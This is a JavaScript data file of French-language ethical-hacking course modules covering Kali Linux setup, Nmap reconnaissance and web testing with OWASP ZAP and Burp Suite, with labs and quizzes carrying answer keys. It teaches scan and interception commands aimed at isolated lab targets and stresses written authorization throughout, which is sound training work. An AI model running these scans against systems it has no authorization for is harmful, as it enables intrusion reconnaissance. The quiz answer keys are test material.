const PHASE3 = [
  {
    id: "S13", week: 13, phase: 3,
    title: "Prise en main de Kali Linux",
    level: "avance",
    duration: "Semaine 13 · ~8h",
    intro: "La Phase 3 d'HACKINÉTIQUE ouvre la partie la plus offensive du programme : le test d'intrusion. Avant de scanner, d'exploiter ou de post-exploiter quoi que ce soit, chaque futur pentester doit installer son arsenal — Kali Linux — et, plus important encore, signer et intérioriser une charte éthique. Sans autorisation écrite, aucune technique enseignée ici ne doit jamais être exécutée en dehors d'un laboratoire.",
    objectives: [
      "Installer et configurer Kali Linux dans une machine virtuelle isolée.",
      "Identifier les grandes familles d'outils Kali (recon, exploitation, post-exploitation, forensics).",
      "Comprendre et signer la charte éthique du hacker professionnel.",
      "Situer le cadre légal du pentest (autorisation écrite, périmètre, non-divulgation).",
      "Configurer un réseau isolé (NAT/host-only) pour ses futurs laboratoires."
    ],
    definition: "Kali Linux est une distribution Linux basée sur Debian, maintenue par Offensive Security, préinstallée avec plus de 600 outils de test d'intrusion, d'audit de sécurité et de forensics. Cette semaine couvre son installation en VM, un panorama de ses outils principaux, et la charte éthique qui encadre légalement toute utilisation.",
    analogy: { title: "🧰 Kali Linux comme caisse à outils du serrurier agréé", text: "Un serrurier professionnel possède des outils capables d'ouvrir n'importe quelle porte. Ce qui le distingue d'un cambrioleur n'est pas l'outil, mais l'autorisation écrite du propriétaire avant d'intervenir. Kali Linux, c'est votre caisse à outils : sa légitimité dépend entièrement du mandat que vous avez pour l'utiliser." },
    keyTerms: [
      { term: "Pentest (test d'intrusion)", def: "Simulation autorisée d'une cyberattaque visant à identifier les vulnérabilités d'un système avant qu'un attaquant réel ne les exploite." },
      { term: "Périmètre (scope)", def: "Liste précise des systèmes, adresses IP ou applications qu'un pentester est autorisé à tester, définie contractuellement avant toute intervention." },
      { term: "Charte éthique (Rules of Engagement)", def: "Document signé encadrant un test d'intrusion : périmètre, dates, techniques autorisées, contacts d'urgence, clause de confidentialité." },
      { term: "Machine virtuelle isolée", def: "Environnement virtualisé (VirtualBox, VMware) dont le réseau est configuré en mode NAT ou host-only pour empêcher tout trafic vers l'extérieur du laboratoire." }
    ],
    lesson: [
      { heading: "Pourquoi Kali Linux et pas un autre OS ?", html: "<p>Kali Linux n'est pas « juste une distribution Linux » : c'est un environnement préconfiguré et maintenu spécifiquement pour l'audit de sécurité offensif. Il regroupe des outils de reconnaissance (Nmap, theHarvester), d'analyse web (Burp Suite, OWASP ZAP), d'exploitation (Metasploit, SQLmap) et de post-exploitation (Mimikatz, BloodHound), tous organisés par catégorie dans le menu <code>Applications</code>.</p><p>Utiliser Kali en entreprise ou en freelance de manière légitime suppose systématiquement un <strong>mandat écrit</strong> : contrat de prestation, ordre de mission signé, ou autorisation explicite du propriétaire du système testé.</p>" },
      { heading: "Installation en machine virtuelle", html: "<p>Nous installons Kali en VM (VirtualBox ou VMware) plutôt qu'en dual-boot, pour deux raisons : l'isolation du réseau hôte, et la possibilité de revenir à un instantané (<em>snapshot</em>) propre après chaque manipulation.</p><pre><code># Vérifier la virtualisation matérielle activée dans le BIOS (VT-x/AMD-V)\n# Télécharger l'image officielle depuis kali.org/get-kali\n# Créer la VM : 2 vCPU, 4 Go RAM minimum, 40 Go disque, réseau en mode NAT ou Host-Only\n# Après installation :\nsudo apt update && sudo apt full-upgrade -y\nsudo apt install -y kali-linux-headless</code></pre><p>Le mode réseau <strong>Host-Only</strong> ou un <strong>réseau interne</strong> (NAT Network) est fortement recommandé pour tous les TP de cette phase : il garantit que Kali ne peut jamais atteindre Internet ni le réseau domestique par erreur.</p>" },
      { heading: "Panorama des outils par catégorie", html: "<p>Le menu Kali organise les outils selon les phases classiques d'un test d'intrusion (proches des tactiques MITRE ATT&CK) :</p><ul><li><strong>Information Gathering</strong> : Nmap, theHarvester, Recon-ng (reconnaissance).</li><li><strong>Vulnerability Analysis</strong> : Nikto, OpenVAS.</li><li><strong>Web Application Analysis</strong> : Burp Suite, OWASP ZAP, SQLmap.</li><li><strong>Exploitation Tools</strong> : Metasploit Framework, searchsploit.</li><li><strong>Password Attacks</strong> : Hydra, John the Ripper, Hashcat.</li><li><strong>Post Exploitation</strong> : Mimikatz (via Windows), BloodHound, Empire.</li><li><strong>Forensics / Reporting</strong> : Autopsy, dc3dd, Faraday.</li></ul><p>Cette phase du programme suivra approximativement cet ordre : reconnaissance (S14), analyse web (S15), injections (S16), exploitation (S17), CTF final (S18).</p>" },
      { heading: "La charte éthique : le socle non négociable", html: "<p>Aucune commande enseignée dans cette phase ne doit être exécutée contre un système que vous ne possédez pas ou pour lequel vous n'avez pas reçu d'<strong>autorisation écrite explicite</strong>. C'est la règle d'or, sans exception :</p><ul><li>Vous ne testez que vos propres machines virtuelles, ou des plateformes légales conçues pour l'entraînement (TryHackMe, HackTheBox, OWASP Juice Shop, DVWA, Metasploitable).</li><li>Un accès non autorisé à un système informatique tiers constitue une infraction pénale dans la quasi-totalité des juridictions (en France : article 323-1 du Code pénal ; loi béninoise n°2017-20 sur le numérique réprime également les accès frauduleux).</li><li>Même « juste pour voir », un scan de port sur un système non autorisé peut être considéré comme une tentative d'intrusion.</li></ul><p>Cette charte sera signée cette semaine et devra être rappelée avant chaque TP pratique du programme.</p>" },
      { heading: "Le cadre légal du pentest professionnel", html: "<p>Un pentest professionnel encadré s'appuie toujours sur : un <strong>contrat</strong> précisant le périmètre exact (IP, domaines, dates), des <strong>Rules of Engagement</strong> (techniques autorisées ou interdites, fenêtres horaires), et une clause de <strong>non-divulgation</strong> (NDA) protégeant les données découvertes. La méthodologie PTES (Penetration Testing Execution Standard) formalise ces étapes : Pre-engagement, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation, Reporting.</p>" }
    ],
    standards: ["PTES — Pre-Engagement Interactions", "MITRE ATT&CK — Tactique Reconnaissance (TA0043)", "EC-Council CEH — Module 1 : Introduction à l'Ethical Hacking"],
    steps: [
      { text: "Installer Kali Linux dans une machine virtuelle isolée (réseau NAT/Host-Only).", color: "blue" },
      { text: "Explorer et cataloguer les outils par catégorie (recon, web, exploitation, post-exploitation).", color: "orange" },
      { text: "Lire, comprendre et signer la charte éthique du hacker professionnel.", color: "blue" },
      { text: "Étudier le cadre légal applicable (autorisation écrite, périmètre, sanctions encourues).", color: "orange" },
      { text: "Livrable : charte éthique signée + capture d'écran de Kali opérationnel.", color: "red" }
    ],
    deliverable: "Une charte éthique signée (nom, date, engagement formel) accompagnée d'une capture d'écran de la VM Kali Linux à jour et opérationnelle, avec le résultat de la commande neofetch ou uname -a affiché dans le terminal.",
    tp: {
      title: "TP S13 — Construire son laboratoire offensif et signer la charte éthique",
      objectif: "Mettre en place un environnement Kali Linux isolé, opérationnel, et formaliser son engagement éthique avant toute manipulation offensive future.",
      duree: "90–120 minutes",
      materiel: ["Un hyperviseur (VirtualBox ou VMware Workstation/Player)", "L'image ISO officielle de Kali Linux (kali.org)", "Au moins 4 Go de RAM disponibles et 40 Go d'espace disque", "Modèle de charte éthique fourni par l'instructeur"],
      consignes: [
        "Télécharger l'image ISO officielle de Kali Linux depuis le site officiel kali.org (jamais un miroir tiers non vérifié).",
        "Créer une VM avec 2 vCPU, 4 Go de RAM minimum, 40 Go de disque, et configurer le réseau en mode Host-Only ou NAT Network (jamais en Bridge sur ce TP).",
        "Installer Kali Linux, créer un utilisateur non-root, puis exécuter la mise à jour du système (apt update && apt full-upgrade).",
        "Explorer le menu Applications et lister au moins 10 outils répartis sur 4 catégories différentes (recon, web, exploitation, post-exploitation), avec une phrase décrivant l'usage de chacun.",
        "Prendre un instantané (snapshot) de la VM propre, nommé « Kali - Etat initial », avant toute manipulation offensive future.",
        "Lire intégralement le modèle de charte éthique, la compléter avec son nom et la date, puis la signer (signature manuscrite scannée ou signature électronique).",
        "Rédiger un court paragraphe (5-10 lignes) expliquant pourquoi l'autorisation écrite est la condition absolue de toute action offensive légale."
      ],
      livrable: "Une capture d'écran de la VM Kali fonctionnelle affichant uname -a, la liste des 10 outils catalogués, et le fichier de la charte éthique signée (PDF ou image).",
      criteres: ["La VM Kali est installée, à jour, et isolée du réseau domestique/Internet en accès direct.", "Au moins 10 outils sont correctement catalogués par catégorie avec une description juste.", "La charte éthique est intégralement lue, complétée et signée.", "Le paragraphe de réflexion démontre une compréhension claire du cadre légal et de la nécessité d'une autorisation écrite."]
    },
    quiz: [
      { q: "Quelle est la condition absolue avant d'utiliser un outil offensif de Kali Linux sur un système ?", options: ["Avoir une connexion Internet rapide", "Disposer d'une autorisation écrite explicite du propriétaire du système", "Utiliser un VPN", "Avoir plus de 6 mois d'expérience"], correct: 1, explanation: "Le pentest n'est légal que dans le cadre d'une autorisation écrite explicite (contrat, ordre de mission, Rules of Engagement) définissant précisément le périmètre autorisé." },
      { q: "Pourquoi installer Kali Linux en machine virtuelle avec un réseau NAT ou Host-Only plutôt qu'en Bridge pour les TP de laboratoire ?", options: ["Parce que le mode Bridge est plus lent", "Pour empêcher tout trafic accidentel vers le réseau domestique ou Internet", "Parce que VirtualBox ne supporte pas le mode Bridge", "Pour économiser de la RAM"], correct: 1, explanation: "L'isolation réseau (NAT/Host-Only) garantit que les manipulations offensives restent confinées au laboratoire virtuel et ne peuvent pas atteindre accidentellement des systèmes tiers non autorisés." },
      { q: "Que signifie l'acronyme PTES ?", options: ["Penetration Testing Execution Standard", "Protocol Testing and Evaluation System", "Private Test Environment Setup", "Public Threat Evaluation Standard"], correct: 0, explanation: "Le PTES (Penetration Testing Execution Standard) est un référentiel méthodologique reconnu qui structure un test d'intrusion en sept phases, de la préparation contractuelle au rapport final." },
      { q: "Un scan de ports effectué « juste pour voir » sur un serveur d'entreprise tiers, sans autorisation, est :", options: ["Toujours légal tant qu'aucune donnée n'est modifiée", "Potentiellement une infraction pénale, même sans intention malveillante avérée", "Légal si le scan dure moins d'une minute", "Autorisé si l'outil utilisé est open source"], correct: 1, explanation: "L'accès ou la tentative d'accès non autorisé à un système, y compris un simple scan, peut être qualifié pénalement dans la plupart des juridictions, indépendamment de l'intention ou du résultat." },
      { q: "Parmi les catégories d'outils suivantes, laquelle regroupe Nmap et theHarvester dans le menu de Kali Linux ?", options: ["Post Exploitation", "Password Attacks", "Information Gathering", "Forensics"], correct: 2, explanation: "Nmap et theHarvester sont des outils de reconnaissance, classés dans la catégorie « Information Gathering », correspondant à la tactique Reconnaissance du framework MITRE ATT&CK." }
    ]
  },

  {
    id: "S14", week: 14, phase: 3,
    title: "Reconnaissance avec Nmap",
    level: "avance",
    duration: "Semaine 14 · ~8h",
    intro: "Toute intrusion légitime commence par la reconnaissance : cartographier une cible autorisée avant d'envisager la moindre exploitation. Nmap (Network Mapper) est l'outil de référence pour découvrir les hôtes actifs, les ports ouverts, les services exposés et parfois le système d'exploitation sous-jacent. Cette semaine se pratique exclusivement sur des cibles de laboratoire (VM Metasploitable, machines TryHackMe/HackTheBox autorisées).",
    objectives: [
      "Maîtriser la syntaxe de base et avancée de Nmap.",
      "Réaliser des scans de ports TCP et UDP adaptés au contexte.",
      "Détecter les versions de services et tenter une identification d'OS.",
      "Utiliser des scripts NSE (Nmap Scripting Engine) pour approfondir l'analyse.",
      "Produire un rapport de reconnaissance structuré et exploitable."
    ],
    definition: "Nmap est un scanner réseau open source permettant de découvrir les hôtes actifs sur un réseau, les ports ouverts, les services associés et, via des techniques de fingerprinting, le système d'exploitation. Le moteur de scripts NSE (Nmap Scripting Engine) étend ses capacités à la détection de vulnérabilités et à l'énumération avancée.",
    analogy: { title: "🗺️ Nmap comme le géomètre avant le chantier", text: "Avant de construire ou de rénover un bâtiment, un géomètre autorisé cartographie le terrain : accès, fondations, réseaux enterrés. Nmap joue ce rôle pour un système d'information : il dresse la carte des portes (ports) ouvertes et des services qui y répondent, sans jamais entrer par effraction." },
    keyTerms: [
      { term: "Port ouvert / fermé / filtré", def: "État d'un port réseau : ouvert (un service répond), fermé (aucun service mais l'hôte répond), filtré (un pare-feu bloque la réponse, état indéterminé)." },
      { term: "Fingerprinting", def: "Technique consistant à analyser les réponses réseau (bannières, comportements TCP/IP) pour déduire la version d'un service ou d'un système d'exploitation." },
      { term: "NSE (Nmap Scripting Engine)", def: "Moteur de scripts Lua intégré à Nmap permettant l'automatisation de tâches avancées : détection de vulnérabilités, énumération, exploitation légère." },
      { term: "Scan SYN (half-open)", def: "Technique de scan furtif envoyant un paquet SYN sans compléter la poignée de main TCP à trois voies, réduisant les traces dans les journaux applicatifs." }
    ],
    lesson: [
      { heading: "Rappel du cadre légal avant tout scan", html: "<p>Un scan Nmap, même passif en apparence, constitue une action de reconnaissance active qui laisse des traces réseau. Il ne doit être exécuté que contre des cibles pour lesquelles vous détenez une <strong>autorisation écrite</strong> : votre propre VM Metasploitable, une machine TryHackMe/HackTheBox, ou un environnement OWASP dédié (Juice Shop, DVWA). Scanner une IP publique tierce sans mandat est illégal, même sans exploitation ultérieure.</p>" },
      { heading: "Syntaxe de base de Nmap", html: "<p>Nmap s'utilise en ligne de commande avec une syntaxe modulaire : cible, type de scan, options de détection.</p><pre><code># Scan simple des ports les plus courants sur une cible de laboratoire\nnmap 192.168.56.101\n\n# Scan de tous les ports TCP (1-65535)\nnmap -p- 192.168.56.101\n\n# Scan rapide, top 100 ports\nnmap -F 192.168.56.101</code></pre><p>L'adresse <code>192.168.56.101</code> représente ici une VM Metasploitable dans un réseau Host-Only isolé — jamais une cible réelle.</p>" },
      { heading: "Scans de ports : TCP SYN, TCP Connect, UDP", html: "<p>Nmap propose plusieurs techniques de scan selon le niveau de privilège et la discrétion recherchée :</p><ul><li><strong>-sS</strong> : scan SYN furtif (nécessite les privilèges root), le plus utilisé en pentest.</li><li><strong>-sT</strong> : scan TCP Connect complet, plus bruyant mais ne nécessite pas de privilèges élevés.</li><li><strong>-sU</strong> : scan UDP, plus lent mais indispensable pour détecter des services comme DNS (53) ou SNMP (161).</li></ul><pre><code># Scan SYN furtif avec détection de version sur les ports courants\nsudo nmap -sS -sV 192.168.56.101\n\n# Scan UDP ciblé sur quelques ports critiques\nsudo nmap -sU -p 53,161,123 192.168.56.101</code></pre>" },
      { heading: "Détection de version et d'OS", html: "<p>Les options <code>-sV</code> et <code>-O</code> permettent d'identifier précisément les services exposés (nom, version) et de tenter une détection du système d'exploitation via l'analyse de la pile TCP/IP.</p><pre><code># Détection de version des services + tentative d'identification de l'OS\nsudo nmap -sV -O 192.168.56.101\n\n# Scan agressif combinant version, OS, scripts par défaut et traceroute\nsudo nmap -A 192.168.56.101</code></pre><p>La détection d'OS reste probabiliste : elle s'appuie sur des signatures TTL, tailles de fenêtre TCP et options d'en-tête, et peut se tromper sur des systèmes durcis ou virtualisés.</p>" },
      { heading: "Le moteur de scripts NSE", html: "<p>Le NSE permet d'exécuter des scripts Lua catégorisés (vuln, safe, auth, discovery...) pour approfondir l'analyse d'un service :</p><pre><code># Lister les scripts disponibles liés à http\nls /usr/share/nmap/scripts/ | grep http\n\n# Exécuter les scripts de détection de vulnérabilités connues\nsudo nmap --script vuln 192.168.56.101\n\n# Cibler un script précis (exemple : énumération SMB)\nsudo nmap --script smb-enum-shares -p 445 192.168.56.101</code></pre><p>Les scripts de la catégorie <code>vuln</code> peuvent générer un trafic important : à réserver strictement aux environnements de laboratoire.</p>" },
      { heading: "Structurer un rapport de reconnaissance", html: "<p>Un rapport de reconnaissance professionnel liste, par hôte : l'adresse IP, les ports ouverts, les services et versions identifiés, l'OS probable, et les pistes de vulnérabilités détectées par NSE — sans jamais exploiter à ce stade (phase distincte du PTES). Ce document sert de base à la phase d'analyse de vulnérabilités (S15-S16).</p>" }
    ],
    standards: ["MITRE ATT&CK — Technique T1046 (Network Service Discovery)", "PTES — Intelligence Gathering", "EC-Council CEH — Module 3 : Scanning Networks"],
    steps: [
      { text: "Réviser la syntaxe de base de Nmap et ses principales options.", color: "blue" },
      { text: "Réaliser des scans de ports TCP/UDP sur une cible de laboratoire autorisée.", color: "orange" },
      { text: "Détecter les versions de services exposés avec -sV.", color: "blue" },
      { text: "Tenter l'identification de l'OS avec -O et le scan agressif -A.", color: "orange" },
      { text: "Exploiter des scripts NSE pour approfondir l'énumération.", color: "blue" },
      { text: "Livrable : rapport de reconnaissance structuré.", color: "red" }
    ],
    deliverable: "Un rapport de reconnaissance (format Markdown ou PDF) documentant, pour une VM Metasploitable en laboratoire : hôtes actifs, ports ouverts, services/versions, OS probable, et résultats pertinents des scripts NSE utilisés.",
    tp: {
      title: "TP S14 — Cartographier une machine Metasploitable en laboratoire",
      objectif: "Réaliser une reconnaissance réseau complète et méthodique d'une cible de laboratoire autorisée à l'aide de Nmap, et en documenter les résultats.",
      duree: "90 minutes",
      materiel: ["VM Kali Linux opérationnelle (S13)", "VM Metasploitable 2 ou 3 (cible volontairement vulnérable, réseau Host-Only)", "Accès terminal avec privilèges sudo"],
      consignes: [
        "Rappeler le cadre légal : ce TP s'exécute uniquement contre la VM Metasploitable détenue en propre, isolée dans un réseau Host-Only, jamais contre une IP publique.",
        "Démarrer les deux VM (Kali et Metasploitable) sur le même réseau interne, puis identifier l'adresse IP de la cible (ip a ou netdiscover).",
        "Lancer un scan de découverte rapide (-F) puis un scan complet de tous les ports TCP (-p-) et noter les ports ouverts.",
        "Effectuer un scan de détection de version et d'OS combiné (-sV -O) sur les ports ouverts identifiés.",
        "Exécuter au moins deux scripts NSE pertinents (par exemple --script vuln et un script ciblé sur un service détecté, comme ftp-anon ou smb-enum-shares).",
        "Compiler l'ensemble des résultats dans un rapport de reconnaissance structuré : hôte, ports, services/versions, OS probable, vulnérabilités potentielles signalées par NSE.",
        "Conclure le rapport par une priorisation des services les plus préoccupants à approfondir lors des semaines suivantes."
      ],
      livrable: "Un rapport de reconnaissance au format Markdown ou PDF, incluant les commandes exécutées et une synthèse claire des résultats par service.",
      criteres: ["Les scans TCP et UDP sont exécutés correctement avec les options adaptées.", "La détection de version et d'OS est documentée avec ses résultats bruts.", "Au moins deux scripts NSE pertinents sont utilisés et interprétés.", "Le rapport final est structuré, lisible et rappelle explicitement le cadre légal du test."]
    },
    quiz: [
      { q: "Quelle option Nmap permet de réaliser un scan SYN furtif ?", options: ["-sT", "-sS", "-sU", "-sP"], correct: 1, explanation: "L'option -sS déclenche un scan SYN (half-open), qui n'achève pas la poignée de main TCP complète, réduisant les traces applicatives, et nécessite les privilèges root." },
      { q: "Pourquoi le scan UDP (-sU) est-il généralement plus lent que le scan TCP ?", options: ["Parce que UDP transmet plus de données", "Parce qu'un port UDP fermé ne renvoie souvent aucune réponse, forçant Nmap à attendre un timeout", "Parce que UDP nécessite une poignée de main à trois voies", "Parce que UDP est chiffré par défaut"], correct: 1, explanation: "UDP étant un protocole sans connexion, l'absence de réponse d'un port fermé oblige Nmap à attendre l'expiration d'un délai avant de conclure, ce qui ralentit considérablement le scan par rapport au TCP." },
      { q: "À quoi sert le moteur NSE (Nmap Scripting Engine) ?", options: ["À accélérer uniquement la vitesse de scan", "À exécuter des scripts Lua pour l'énumération avancée et la détection de vulnérabilités", "À chiffrer le trafic de scan", "À remplacer entièrement Metasploit"], correct: 1, explanation: "Le NSE permet d'exécuter des scripts Lua catégorisés (vuln, auth, discovery, etc.) qui étendent les capacités de Nmap au-delà du simple scan de ports, jusqu'à la détection de vulnérabilités connues." },
      { q: "Dans quel contexte est-il légitime de lancer un scan Nmap avec l'option --script vuln ?", options: ["Contre n'importe quelle IP publique trouvée sur Internet", "Uniquement contre une cible de laboratoire pour laquelle on dispose d'une autorisation explicite", "Contre le Wi-Fi d'un voisin pour tester ses compétences", "Contre un serveur d'entreprise sans en informer le propriétaire"], correct: 1, explanation: "Le scan de vulnérabilités génère un trafic actif potentiellement détecté comme malveillant ; il ne doit être utilisé que dans un cadre autorisé (laboratoire personnel, VM dédiée, plateforme d'entraînement légale)." },
      { q: "Que signifie un port signalé comme « filtré » par Nmap ?", options: ["Le port est ouvert et un service y répond normalement", "Le port est fermé et aucun service n'écoute", "Un pare-feu ou un filtre bloque la réponse, rendant l'état du port indéterminé", "Le port n'existe pas sur la machine cible"], correct: 2, explanation: "Un port « filtré » signifie que Nmap n'a pas reçu de réponse claire, généralement parce qu'un pare-feu bloque les paquets, empêchant de déterminer avec certitude si le port est ouvert ou fermé." }
    ]
  },

  {
    id: "S15", week: 15, phase: 3,
    title: "Sécurité des applications web (OWASP)",
    level: "avance",
    duration: "Semaine 15 · ~8h",
    intro: "Les applications web restent la surface d'attaque la plus exposée en 2026. Cette semaine plonge dans la méthodologie OWASP : utilisation d'OWASP ZAP pour l'analyse automatisée, exploration approfondie de l'OWASP Top 10, et prise en main du proxy d'interception Burp Suite. Toutes les manipulations se pratiquent sur des applications volontairement vulnérables et légales : OWASP Juice Shop, DVWA, WebGoat.",
    objectives: [
      "Installer et configurer OWASP ZAP pour l'analyse de sécurité web.",
      "Réaliser une analyse automatisée (active et passive) sur une application cible autorisée.",
      "Approfondir les 10 catégories de risques de l'OWASP Top 10 (2021).",
      "Utiliser Burp Suite comme proxy d'interception pour analyser le trafic HTTP/HTTPS.",
      "Produire un rapport d'analyse de vulnérabilités web structuré."
    ],
    definition: "OWASP ZAP (Zed Attack Proxy) est un scanner de sécurité web open source maintenu par l'OWASP Foundation, permettant l'analyse automatisée (spidering, scan actif/passif) d'applications web. Burp Suite est un proxy d'interception professionnel permettant d'observer, modifier et rejouer les requêtes HTTP entre un navigateur et une application cible.",
    analogy: { title: "🔍 ZAP et Burp comme l'inspecteur du bâtiment", text: "Un inspecteur du bâtiment autorisé vérifie systématiquement chaque porte, fenêtre et issue de secours d'un immeuble avant sa mise en service, en suivant une checklist normée. OWASP ZAP joue ce rôle pour une application web : il parcourt systématiquement chaque page et paramètre à la recherche de failles connues, listées dans une norme reconnue : l'OWASP Top 10." },
    keyTerms: [
      { term: "OWASP Top 10", def: "Classement de référence, mis à jour périodiquement par l'OWASP Foundation, des dix catégories de risques de sécurité applicative web les plus critiques (édition 2021 en vigueur)." },
      { term: "Proxy d'interception", def: "Outil se positionnant entre le navigateur et le serveur web, permettant de visualiser, intercepter et modifier chaque requête/réponse HTTP en transit." },
      { term: "Spidering (araignée)", def: "Technique d'exploration automatique d'une application web consistant à suivre tous les liens et formulaires accessibles pour cartographier sa structure." },
      { term: "Scan actif vs passif", def: "Le scan passif observe le trafic sans envoyer de requêtes modifiées (non intrusif) ; le scan actif envoie des charges de test pour provoquer et détecter des comportements vulnérables (intrusif)." }
    ],
    lesson: [
      { heading: "Cadre légal spécifique aux applications web", html: "<p>Les scans actifs de ZAP ou les manipulations Burp Suite envoient des charges (payloads) potentiellement perturbatrices pour une application. Ils ne doivent être exécutés que sur des cibles explicitement conçues pour l'entraînement : <strong>OWASP Juice Shop</strong>, <strong>DVWA</strong>, <strong>WebGoat</strong>, ou une application personnelle en environnement de développement local. Scanner un site de production tiers, même « juste pour tester », est une infraction.</p>" },
      { heading: "Installer et configurer OWASP ZAP", html: "<p>OWASP ZAP est préinstallé sur Kali Linux ou disponible via le site officiel zaproxy.org. Il s'utilise en mode graphique (Desktop) ou en ligne de commande pour l'automatisation.</p><pre><code># Lancer ZAP en mode graphique\nzaproxy &\n\n# Lancer un scan automatisé complet en ligne de commande contre une cible locale autorisée\nzap-full-scan.py -t http://localhost:3000 -r rapport_zap.html</code></pre><p>L'URL <code>http://localhost:3000</code> correspond ici à une instance locale d'OWASP Juice Shop lancée en conteneur Docker, jamais à un domaine tiers.</p>" },
      { heading: "Analyse automatisée : spider puis scan actif", html: "<p>La méthodologie ZAP classique se déroule en deux temps : d'abord le <em>spidering</em> pour cartographier l'application, puis le <em>scan actif</em> pour tester chaque paramètre découvert.</p><pre><code># Étape 1 : cartographier l'application (spider)\n# Menu ZAP > Automated Scan > URL cible > Attack\n\n# Étape 2 : lancer le scan actif sur les URLs découvertes\n# ZAP soumet automatiquement des charges de test (XSS, injection, etc.)\n# et classe les alertes par sévérité : High / Medium / Low / Informational</code></pre><p>Chaque alerte générée par ZAP référence directement une catégorie de l'OWASP Top 10, facilitant la priorisation des correctifs.</p>" },
      { heading: "OWASP Top 10 (2021) en profondeur", html: "<p>Le classement 2021 structure les risques applicatifs majeurs :</p><ul><li><strong>A01 – Broken Access Control</strong> : contrôle d'accès défaillant (ex. accès à des ressources d'un autre utilisateur).</li><li><strong>A02 – Cryptographic Failures</strong> : chiffrement absent ou faible de données sensibles.</li><li><strong>A03 – Injection</strong> : SQL, NoSQL, commande OS, LDAP (approfondi en S16).</li><li><strong>A05 – Security Misconfiguration</strong> : configurations par défaut, en-têtes de sécurité manquants.</li><li><strong>A07 – Identification and Authentication Failures</strong> : gestion de session ou d'authentification faible.</li></ul><p>Sur Juice Shop, chaque catégorie correspond à un ou plusieurs défis pédagogiques permettant de manipuler concrètement ces failles.</p>" },
      { heading: "Burp Suite : le proxy d'interception professionnel", html: "<p>Burp Suite (édition Community, gratuite) permet d'intercepter et modifier manuellement les requêtes HTTP, complémentaire à l'automatisation de ZAP.</p><pre><code># Configuration : navigateur pointé sur le proxy Burp (127.0.0.1:8080)\n# Installer le certificat CA Burp dans le navigateur pour intercepter le HTTPS\n\n# Dans l'onglet Proxy > Intercept : activer l'interception\n# Modifier une requête interceptée (ex. paramètre id=1 -> id=2) puis Forward\n\n# Utiliser Repeater pour rejouer et affiner une requête modifiée\n# Utiliser Intruder pour automatiser des tests par force brute sur un paramètre</code></pre><p>Burp est particulièrement utile pour tester manuellement le contrôle d'accès (A01) en modifiant des identifiants de session ou de ressource.</p>" },
      { heading: "Structurer un rapport d'analyse web", html: "<p>Un rapport d'analyse ZAP professionnel classe chaque vulnérabilité par sévérité, référence sa catégorie OWASP Top 10, décrit la requête de preuve de concept (PoC), et propose une recommandation de correction concrète — c'est cette structure qui sera exigée dans le livrable de la semaine.</p>" }
    ],
    standards: ["OWASP Top 10 (2021) — A01, A02, A03, A05, A07", "OWASP Testing Guide (WSTG)", "PTES — Vulnerability Analysis"],
    steps: [
      { text: "Installer et prendre en main OWASP ZAP sur Kali Linux.", color: "blue" },
      { text: "Lancer une analyse automatisée (spider + scan actif) sur Juice Shop/DVWA en local.", color: "orange" },
      { text: "Approfondir chaque catégorie pertinente de l'OWASP Top 10 (2021).", color: "blue" },
      { text: "Configurer et utiliser Burp Suite comme proxy d'interception manuel.", color: "orange" },
      { text: "Livrable : rapport d'analyse ZAP structuré par sévérité et catégorie OWASP.", color: "red" }
    ],
    deliverable: "Un rapport d'analyse OWASP ZAP (export HTML ou PDF) sur une application locale autorisée (Juice Shop ou DVWA), enrichi d'au moins deux observations manuelles réalisées via Burp Suite.",
    tp: {
      title: "TP S15 — Audit web automatisé et manuel sur OWASP Juice Shop",
      objectif: "Réaliser un audit de sécurité applicative complet combinant scan automatisé (ZAP) et interception manuelle (Burp Suite) sur une application volontairement vulnérable et légale.",
      duree: "120 minutes",
      materiel: ["VM Kali Linux avec OWASP ZAP et Burp Suite Community", "OWASP Juice Shop déployé en local (Docker : docker run -p 3000:3000 bkimminich/juice-shop)", "Navigateur configuré avec proxy local"],
      consignes: [
        "Rappeler le cadre légal : cette analyse ne cible que l'instance locale de Juice Shop déployée par l'apprenant, jamais une instance hébergée par un tiers sans autorisation.",
        "Déployer Juice Shop en local via Docker et vérifier son accessibilité sur http://localhost:3000.",
        "Lancer un Automated Scan complet dans ZAP contre cette URL locale et attendre la fin du spidering et du scan actif.",
        "Exporter le rapport ZAP (HTML) et identifier les 3 alertes de sévérité High les plus critiques, en les reliant à leur catégorie OWASP Top 10.",
        "Configurer Burp Suite comme proxy du navigateur, intercepter une requête de connexion, et tenter une modification manuelle d'un paramètre pour observer le contrôle d'accès (A01).",
        "Documenter chaque vulnérabilité identifiée (nom, sévérité, catégorie OWASP, requête de preuve, recommandation de correction).",
        "Compiler l'ensemble dans un rapport final structuré et cohérent."
      ],
      livrable: "Un rapport d'analyse combinant l'export ZAP et les observations Burp Suite, avec au minimum 5 vulnérabilités documentées et classées par sévérité.",
      criteres: ["Le scan ZAP est correctement exécuté et exporté sur une cible locale autorisée.", "Au moins 3 alertes critiques sont analysées et reliées à une catégorie précise de l'OWASP Top 10.", "Burp Suite est utilisé pour au moins une observation manuelle pertinente.", "Le rapport final est structuré, avec recommandations de correction concrètes pour chaque faille."]
    },
    quiz: [
      { q: "Que fait la phase de « spidering » dans OWASP ZAP ?", options: ["Elle chiffre le trafic HTTP", "Elle cartographie l'application en suivant automatiquement les liens et formulaires", "Elle bloque les attaques en temps réel", "Elle génère un rapport PDF final"], correct: 1, explanation: "Le spider explore automatiquement l'application en suivant les liens, formulaires et ressources accessibles, afin de construire une carte complète avant le scan actif." },
      { q: "Quelle catégorie de l'OWASP Top 10 (2021) correspond à un utilisateur pouvant accéder aux données d'un autre utilisateur en modifiant simplement un identifiant dans l'URL ?", options: ["A02 – Cryptographic Failures", "A01 – Broken Access Control", "A05 – Security Misconfiguration", "A03 – Injection"], correct: 1, explanation: "Ce scénario est un exemple classique de contrôle d'accès défaillant (A01 – Broken Access Control), où l'application ne vérifie pas correctement les droits de l'utilisateur sur la ressource demandée." },
      { q: "Quelle est la différence essentielle entre un scan passif et un scan actif dans ZAP ?", options: ["Le scan passif est payant, le scan actif est gratuit", "Le scan actif envoie des charges de test intrusives, le scan passif se contente d'observer le trafic", "Le scan passif ne fonctionne que sur HTTPS", "Il n'y a aucune différence fonctionnelle"], correct: 1, explanation: "Le scan passif analyse uniquement le trafic déjà généré sans envoyer de requêtes modifiées, tandis que le scan actif soumet volontairement des charges de test pour provoquer et détecter des comportements vulnérables." },
